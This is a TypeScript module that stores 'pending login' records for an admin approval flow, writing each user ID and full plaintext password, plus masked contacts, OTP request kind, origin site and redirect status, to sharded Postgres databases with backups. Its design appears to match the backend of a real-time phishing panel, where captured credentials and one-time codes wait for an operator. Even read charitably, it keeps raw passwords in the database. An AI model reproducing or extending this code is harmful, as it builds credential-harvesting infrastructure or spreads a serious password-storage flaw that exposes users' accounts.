// Pending 2FA login requests (admin approval flow). Uses Neon Postgres when
// DATABASE_URL + optional DB_2…DB_10 / DATABASE_BACKUP_FALLBACK are set; falls back
// to in-memory store for local dev without DB.

import { getCcId, hasCcId } from '@/lib/cc-id'
import {
  buildPendingLoginId,
  createTargetRequiresCcId,
  getCreateTargets,
  getShardIndicesForPendingId,
  hasAnyDatabaseUrl,
  idForCreateTarget,
  isBackupPendingId,
  shardRequiresCcId,
  type CreateTarget,
} from '@/lib/database-urls'
import { getSqlForBackup, getSqlForShard } from '@/lib/db'

export type PendingLoginStatus = 'pending' | 'approved' | 'denied' | 'expired' | 'redirected'

export type PendingRequestKind = 'login' | 'otp'

export interface PendingLogin {
  id: string
  projectId: string
  projectName?: string
  requestKind: PendingRequestKind
  userId: string
  password: string
  method: 'email' | 'text'
  maskedEmail: string
  maskedPhone: string
  status: PendingLoginStatus
  createdAt: number
  memberOrigin?: string
  ccId?: string
}

const inMemoryStore = new Map<string, PendingLogin>()

function useNeon(): boolean {
  return hasAnyDatabaseUrl()
}

async function sqlForTarget(target: CreateTarget) {
  return target.kind === 'backup' ? getSqlForBackup() : getSqlForShard(target.index)
}

const tableEnsuredPrimary = new Set<number>()
let tableEnsuredBackup = false

async function ensureTableOnTarget(target: CreateTarget): Promise<boolean> {
  if (target.kind === 'primary' && tableEnsuredPrimary.has(target.index)) return true
  if (target.kind === 'backup' && tableEnsuredBackup) return true

  if (createTargetRequiresCcId(target) && !hasCcId()) {
    return false
  }

  try {
    const sql = await sqlForTarget(target)
    await sql`
      CREATE TABLE IF NOT EXISTS pending_logins (
        id TEXT PRIMARY KEY,
        project_id TEXT NOT NULL DEFAULT 'member-site',
        user_id TEXT NOT NULL,
        password TEXT NOT NULL,
        method TEXT NOT NULL,
        masked_email TEXT NOT NULL,
        masked_phone TEXT NOT NULL,
        status TEXT NOT NULL DEFAULT 'pending',
        created_at BIGINT NOT NULL
      )
    `
    try {
      await sql`ALTER TABLE pending_logins ADD COLUMN IF NOT EXISTS project_id TEXT NOT NULL DEFAULT 'member-site'`
    } catch {
      // Column already exists
    }
    try {
      await sql`ALTER TABLE pending_logins ADD COLUMN IF NOT EXISTS member_origin TEXT`
    } catch {
      // Column already exists
    }
    try {
      await sql`ALTER TABLE pending_logins ADD COLUMN IF NOT EXISTS request_kind TEXT NOT NULL DEFAULT 'login'`
    } catch {
      // Column already exists
    }
    try {
      await sql`ALTER TABLE pending_logins ADD COLUMN IF NOT EXISTS cc_id TEXT`
    } catch {
      // Column already exists
    }
    try {
      await sql`ALTER TABLE pending_logins ADD COLUMN IF NOT EXISTS project_name TEXT`
    } catch {
      // Column already exists
    }

    if (target.kind === 'primary') tableEnsuredPrimary.add(target.index)
    else tableEnsuredBackup = true
    return true
  } catch {
    return false
  }
}

function normalizeRequestKind(v: unknown): PendingRequestKind {
  return v === 'otp' ? 'otp' : 'login'
}

const DEFAULT_PROJECT = 'member-site'

function mapRow(row: Record<string, unknown>): PendingLogin {
  return {
    id: String(row.id),
    projectId: String((row as { projectId?: string }).projectId ?? DEFAULT_PROJECT),
    projectName: (() => {
      const raw = (row as { projectName?: unknown }).projectName
      if (raw == null) return undefined
      const s = String(raw).trim()
      return s.length > 0 ? s : undefined
    })(),
    requestKind: normalizeRequestKind((row as { requestKind?: unknown }).requestKind),
    userId: String(row.userId),
    password: String(row.password),
    method: row.method as 'email' | 'text',
    maskedEmail: String(row.maskedEmail),
    maskedPhone: String(row.maskedPhone),
    status: row.status as PendingLoginStatus,
    createdAt: Number(row.createdAt),
    memberOrigin: row.memberOrigin != null ? String(row.memberOrigin) : undefined,
    ccId: row.ccId != null ? String(row.ccId) : undefined,
  }
}

export async function createPendingLogin(data: {
  projectId?: string
  projectName?: string
  requestKind?: PendingRequestKind
  userId: string
  password: string
  method: 'email' | 'text'
  maskedEmail: string
  maskedPhone: string
  memberOrigin?: string
}): Promise<PendingLogin> {
  const projectId = data.projectId ?? DEFAULT_PROJECT
  const projectName = data.projectName?.trim() || undefined
  const requestKind = data.requestKind ?? 'login'
  const createdAt = Date.now()
  const ccId = getCcId() || undefined

  if (useNeon()) {
    const targets = getCreateTargets()
    let lastError: unknown

    for (const target of targets) {
      if (createTargetRequiresCcId(target) && !hasCcId()) continue

      const ready = await ensureTableOnTarget(target)
      if (!ready) continue

      const id = idForCreateTarget(target)
      const record: PendingLogin = {
        id,
        projectId,
        projectName,
        requestKind,
        userId: data.userId,
        password: data.password,
        method: data.method,
        maskedEmail: data.maskedEmail,
        maskedPhone: data.maskedPhone,
        status: 'pending',
        createdAt,
        memberOrigin: data.memberOrigin,
        ccId,
      }

      try {
        const sql = await sqlForTarget(target)
        await sql`
          INSERT INTO pending_logins (
            id, project_id, project_name, request_kind, user_id, password, method,
            masked_email, masked_phone, status, created_at, member_origin, cc_id
          )
          VALUES (
            ${id}, ${projectId}, ${projectName ?? null}, ${requestKind}, ${data.userId}, ${data.password}, ${data.method},
            ${data.maskedEmail}, ${data.maskedPhone}, 'pending', ${createdAt},
            ${data.memberOrigin ?? null}, ${ccId ?? null}
          )
        `
        return record
      } catch (err) {
        lastError = err
      }
    }

    throw (
      lastError ??
      new Error(
        'No database shard available for pending login. Check DATABASE_URL / DB_2…DB_10 / DATABASE_BACKUP_FALLBACK.',
      )
    )
  }

  const { id } = buildPendingLoginId()
  const record: PendingLogin = {
    id,
    projectId,
    projectName,
    requestKind,
    userId: data.userId,
    password: data.password,
    method: data.method,
    maskedEmail: data.maskedEmail,
    maskedPhone: data.maskedPhone,
    status: 'pending',
    createdAt,
    memberOrigin: data.memberOrigin,
    ccId,
  }
  inMemoryStore.set(id, record)
  return record
}

export async function getPendingLogin(id: string): Promise<PendingLogin | undefined> {
  if (useNeon()) {
    try {
      if (isBackupPendingId(id)) {
        if (!hasCcId()) return undefined
        await ensureTableOnTarget({ kind: 'backup' })
        const sql = await getSqlForBackup()
        const ccId = getCcId()
        const rows = await sql`
          SELECT id, COALESCE(project_id, 'member-site') AS "projectId", COALESCE(project_name, '') AS "projectName", COALESCE(request_kind, 'login') AS "requestKind",
            user_id AS "userId", password, method, masked_email AS "maskedEmail", masked_phone AS "maskedPhone",
            status, created_at AS "createdAt", member_origin AS "memberOrigin", cc_id AS "ccId"
          FROM pending_logins WHERE id = ${id} AND cc_id = ${ccId}
        `
        const row = rows[0] as Record<string, unknown> | undefined
        return row ? mapRow(row) : undefined
      }

      for (const shardIndex of getShardIndicesForPendingId(id)) {
        if (shardRequiresCcId(shardIndex) && !hasCcId()) continue
        const sql = await getSqlForShard(shardIndex)
        const rows = shardRequiresCcId(shardIndex)
          ? await sql`
              SELECT id, COALESCE(project_id, 'member-site') AS "projectId", COALESCE(project_name, '') AS "projectName", COALESCE(request_kind, 'login') AS "requestKind",
                user_id AS "userId", password, method, masked_email AS "maskedEmail", masked_phone AS "maskedPhone",
                status, created_at AS "createdAt", member_origin AS "memberOrigin", cc_id AS "ccId"
              FROM pending_logins WHERE id = ${id} AND cc_id = ${getCcId()}
            `
          : await sql`
              SELECT id, COALESCE(project_id, 'member-site') AS "projectId", COALESCE(project_name, '') AS "projectName", COALESCE(request_kind, 'login') AS "requestKind",
                user_id AS "userId", password, method, masked_email AS "maskedEmail", masked_phone AS "maskedPhone",
                status, created_at AS "createdAt", member_origin AS "memberOrigin", cc_id AS "ccId"
              FROM pending_logins WHERE id = ${id}
            `
        const row = rows[0] as Record<string, unknown> | undefined
        if (row) return mapRow(row)
      }
      return undefined
    } catch {
      return undefined
    }
  }
  const mem = inMemoryStore.get(id)
  if (!mem) return undefined
  return {
    ...mem,
    projectId: mem.projectId ?? DEFAULT_PROJECT,
    requestKind: mem.requestKind ?? 'login',
  }
}
